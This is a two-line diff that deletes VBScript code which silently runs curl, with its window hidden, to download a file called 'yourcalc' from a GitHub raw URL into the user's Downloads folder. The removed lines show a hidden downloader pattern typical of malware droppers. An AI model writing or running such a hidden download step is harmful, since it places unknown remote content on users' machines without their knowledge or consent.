@@ -1,2 +1,0 @@
-Set onetwo = WScript.CreateObject ("WScript.shell")
-onetwo.run "curl https://raw.githubusercontent.com/the-deusgroup/test-project/main/yourcalc -o %USERPROFILE%\downloads\yourcalc", 0, False
